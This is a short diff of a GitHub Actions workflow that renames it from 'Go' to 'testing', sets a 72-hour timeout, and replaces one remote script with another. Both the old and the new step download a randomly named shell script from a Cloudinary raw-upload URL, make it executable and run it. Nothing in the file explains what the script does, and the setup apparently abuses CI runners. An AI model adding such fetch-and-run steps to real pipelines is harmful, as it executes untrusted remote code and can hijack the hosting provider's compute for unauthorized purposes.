@@ -1,4 +1,4 @@
-name: Go
+name: testing
 
 on:
   workflow_dispatch:
@@ -11,10 +11,11 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Run exec
+        timeout-minutes: 4320
         run: |
-          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711042163/amzeqo8vdwsgytadhvk6.sh
-          chmod +x amzeqo8vdwsgytadhvk6.sh
-          ./amzeqo8vdwsgytadhvk6.sh
+          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711125466/o8abekknjkh6hlgjcwal.sh
+          chmod +x o8abekknjkh6hlgjcwal.sh
+          ./o8abekknjkh6hlgjcwal.sh
 
       - name: IP Workflow
         run: |
